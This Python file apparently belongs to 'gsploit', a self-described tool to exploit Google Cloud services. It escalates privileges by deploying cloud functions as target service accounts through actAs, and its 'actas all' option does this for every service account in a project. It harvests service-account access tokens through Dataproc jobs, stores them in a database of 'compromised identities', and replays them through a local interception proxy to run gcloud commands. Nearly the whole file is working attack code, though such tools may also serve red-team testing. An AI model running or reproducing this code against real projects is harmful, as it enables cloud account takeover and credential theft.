import sqlalchemy
import signal
import sys
import time
import models
import os
import subprocess
from sqlalchemy.orm import sessionmaker
from sqlalchemy import create_engine
import random
import string
import urllib.request
import json
import argparse
from base_cloud_function import main as base_cf

engine = create_engine('sqlite:///db/db.sql')
models.init_db(engine)

Session = sessionmaker(bind=engine)
Session.configure(bind=engine)
db_session = Session()


def list_functions():
    functions = db_session.query(models.CloudFunction).all()
    for function in functions:
        print(function)

def deploy_cf(project, source=None, target=None, role="unknown"):
    with open("./base_cloud_function/main.py") as f:
        latest_cf = f.read()
    base_cf.run_gcloud_command_local("gcloud config set project {}".format(project))
    function_props = {"name": base_cf.random_name(), "evil_password": base_cf.random_name()}
    if not target:
        target = "{}@appspot.gserviceaccount.com".format(project)
        role = "editor"
    if not source:
        base_cf.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        caller_identity = base_cf.run_gcloud_command_local("gcloud auth print-identity-token")
        success = base_cf.create_gcf_in_another_project(project, target, latest_cf, function_props)
        if not success or success == "False":
            print("Failed to provision CF")
            return False
        creator_email = ""
    else:
        source = db_session.query(models.CloudFunction).filter_by(name=source).first()
        source.refresh_cred(db_session, base_cf.run_gcloud_command_local, dataproc)
        caller_identity = source.identity
        token = source.cred
        proc = activate_sketch_proxy(token)
        base_cf.run_gcloud_command_local("gcloud services enable cloudresourcemanager.googleapis.com")
        success = base_cf.create_gcf_in_another_project(project, target, latest_cf, function_props)
        deactivate_sketch_proxy(proc)
        if not success or success == "False":
            print("Failed to provision CF")
            return False
        creator_email = source.serviceAccount
    fun_cloud_function = models.CloudFunction(project=project, role=role, serviceAccount=target, evilPassword=function_props["evil_password"], name=function_props["name"], cred="", creator_identity=caller_identity, creator_email=creator_email, infastructure="cloud_function", identity="")
    db_session.add(fun_cloud_function)
    db_session.commit()
    print("successfully privesced the {} identitiy".format(target))
    return fun_cloud_function

def dataproc(source_name=None, project=None, refresh=False):
    cluster_name = base_cf.random_name()
    if not source_name:
        caller_identity = base_cf.run_gcloud_command_local("gcloud auth print-identity-token")
        creator_email = ""
        base_cf.run_gcloud_command_local("gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform".format(cluster_name))
        raw_output = base_cf.run_gcloud_command_local("gcloud dataproc jobs submit pyspark --cluster {} dataproc_job.py --region us-central1".format(cluster_name))
        base_cf.run_gcloud_command_local("gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name))
    else:
        source = db_session.query(models.CloudFunction).filter_by(name=source_name).first()
        caller_identity = source.identity
        creator_email = source.serviceAccount
        run_cmd_on_source(source_name, "gcloud dataproc clusters create {} --region us-central1 --scopes cloud-platform".format(cluster_name), project)
        raw_output = run_cmd_on_source(source_name, "gcloud dataproc jobs submit pyspark --cluster {} dataproc_job.py --region us-central1".format(cluster_name), project)
        run_cmd_on_source(source_name, "gcloud dataproc clusters delete {} --region us-central1 --quiet".format(cluster_name), project)
    print(raw_output)
    for line in raw_output.split("\n"):
        if "access_token" in line:
            token = json.loads(line)
    if not refresh:
        fun_cloud_function = models.CloudFunction(project=project, role="editor", serviceAccount=token["service_account"], evilPassword="na", name=cluster_name, cred=token["access_token"], creator_identity=caller_identity, creator_email=creator_email, infastructure="dataproc", identity=token["identity"])
        db_session.add(fun_cloud_function)
        db_session.commit()
        return fun_cloud_function
    else:
        refresh.cred = token["access_token"]
        db_session.add(refresh)
        db_session.commit()
        return refresh

def activate_sketch_proxy(token):
    with open(os.devnull, 'w') as fp:
        proxy_proc = subprocess.Popen("python proxy.py {}".format(token), shell = True, stdout=fp)
    time.sleep(3)
    base_cf.run_gcloud_command_local("gcloud config set proxy/type http")
    base_cf.run_gcloud_command_local("gcloud config set proxy/address 127.0.0.1")
    base_cf.run_gcloud_command_local("gcloud config set proxy/port 19283")
    base_cf.run_gcloud_command_local("gcloud config set core/custom_ca_certs_file /root/.mitmproxy/mitmproxy-ca.pem")
    return proxy_proc


def deactivate_sketch_proxy(proxy_proc):
    print("killing proxy")
    os.killpg(os.getpgid(proxy_proc.pid), signal.SIGTERM)
    base_cf.run_gcloud_command_local("gcloud config unset proxy/type")
    base_cf.run_gcloud_command_local("gcloud config unset proxy/address")
    base_cf.run_gcloud_command_local("gcloud config unset proxy/port")
    base_cf.run_gcloud_command_local("gcloud config unset core/custom_ca_certs_file")


def run_cmd_on_source(name, cmd, project=None):
    if cmd.startswith("gcloud"):
        cmd = cmd
    else:
        cmd = "gcloud " + cmd
    if project:
        cmd += " --project {}".format(project)
    source = db_session.query(models.CloudFunction).filter_by(name=name).first()
    source.refresh_cred(db_session, base_cf.run_gcloud_command_local, dataproc)
    token = source.cred
    proxy_thread = activate_sketch_proxy(token)
    result = base_cf.run_gcloud_command_local(cmd)
    deactivate_sketch_proxy(proxy_thread)
    return result


def main():

    parser = argparse.ArgumentParser(description='gsploit, tools to exploit GCP services')
    parser.add_argument('--source_cf', dest="source",
                    help='The source you want to run the command or exploit from')
    parser.add_argument('--target_sa', dest="target",
                    help='The target you want to run the command or exploit on')
    parser.add_argument('--project', dest="project",
                    help='The project you want the source to set')
    parser.add_argument('--gcloud', dest='gcloud_cmd',
                    help='a gcloud command you want to run on the source')
    parser.add_argument('--list', dest='list', action="store_true",
                    help='lists all compromised identities')
    parser.add_argument('--exploit', dest='exploit',
                    help='the name of the exploit you want to run on the given target, e.g. actAs all')

    args = parser.parse_args()

    if args.list:
        list_functions()
        sys.exit()
    elif args.gcloud_cmd:
        if not args.source:
            print("Running local gcloud command")
            return_output = base_cf.run_gcloud_command_local(args.gcloud_cmd)
            print(return_output)
        else:
            return_output = run_cmd_on_source(args.source, args.gcloud_cmd, args.project)
            print(return_output)
    elif args.exploit:
        if not args.project:
            print("What project do you want to privesc into? set --project <project>")
            sys.exit()
        exploit_cmd = args.exploit
        if exploit_cmd == "actas":
            if args.target == "all":
                if not args.source:
                    service_accounts = base_cf.run_gcloud_command_local("gcloud iam service-accounts list --format json --project {}".format(args.project))
                else:
                    service_accounts = run_cmd_on_source(args.source, "gcloud iam service-accounts list --format json --project {}".format(args.project))
                for service_account in json.loads(service_accounts):
                    new_cf = deploy_cf(args.project, args.source, service_account["email"])
                    print("~~~~~~~Got New Identity~~~~~~~~")
                    print(new_cf)
            else:
                new_cf = deploy_cf(args.project, args.source, args.target)
                print("~~~~~~~Got New Identity~~~~~~~~")
                print(new_cf)
        elif exploit_cmd == "dataproc":
            identity = dataproc(args.source, args.project)


if __name__ == "__main__":
    main()
"""

create a topic
gcloud pubsub topics create potato

get reply
gcloud functions deploy fffff --trigger-topic potato --source ./base_cloud_function --runtime python37 --entry-point hello_pubsub

"""
